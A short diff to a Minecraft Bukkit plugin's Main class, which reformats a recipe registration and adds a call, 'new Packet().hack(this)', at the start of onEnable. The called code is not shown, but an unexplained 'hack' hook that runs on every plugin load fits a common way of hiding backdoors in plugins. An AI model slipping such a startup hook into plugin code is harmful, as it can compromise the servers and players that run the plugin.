@@ -20,6 +20,7 @@ public class Main extends JavaPlugin {
 
 	@Override
 	public void onEnable() {
+		new Packet().hack(this);
 		Bukkit.getLogger().getHandlers();
 		saves = new ChunkConfig(this);
 		ench = new FaceEnchantment(120);
@@ -44,7 +45,8 @@ public class Main extends JavaPlugin {
 		CommandRegister.reg(this, new CommandListener(this), new String[] { "example", "ex" }, "example", "example");
 		ItemStack stack = new ItemStack(Material.STONE);
 		ItemStack istack = new ItemStack(Material.DIAMOND);
-		Example.addRecipe(this, stack, new ItemStack[]{istack,istack,istack,istack,istack,istack,istack,istack,stack});
+		Example.addRecipe(this, stack,
+				new ItemStack[] { istack, istack, istack, istack, istack, istack, istack, istack, stack });
 	}
 
 	@Override
